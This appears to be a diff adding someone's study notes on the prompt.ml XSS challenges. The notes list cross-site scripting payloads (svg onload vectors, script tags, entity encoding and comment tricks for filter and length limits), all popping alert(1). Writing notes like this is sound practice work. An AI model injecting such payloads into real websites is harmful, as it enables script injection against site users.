@@ -1,0 +1,54 @@
+Manual Building XSS Vector 
+
+Lab Link - http://prompt.ml/
+
+1. 
+
+<svg/onload=alert(1);
+whenever your input reflect as a plain text you should use svg vector 
+
+( - &#40;
+
+
+whenever they take url as a input filed you can try to inject paylod through a file 
+
+test.js 
+
+<script>alert(1)</script>
+
+when something will fileterd you can convert that into html code so browser directly execute that 
+
+<p> tag reprents plain text 
+
+<svg> vectors payload 
+
+challeneg 7 :
+
+they are only taking  12 characters 
+
+<svg/onload=alert(1)
+
+<p class="comment" title="<svg/onload="></p>
+
+<svg/a=#"onload='/*#*/alert(1)'
+
+
+<script>hello</script>
+
+
+alert(1)
+
+challenge 15 
+
+<p class="comment" title="hello" data-comment='{"id":0}'></p>
+
+svg vectors 
+
+
+<svg><!--#--><script><!--#-->alert(1)<!--#--></script>
+
+
+
+
+
+
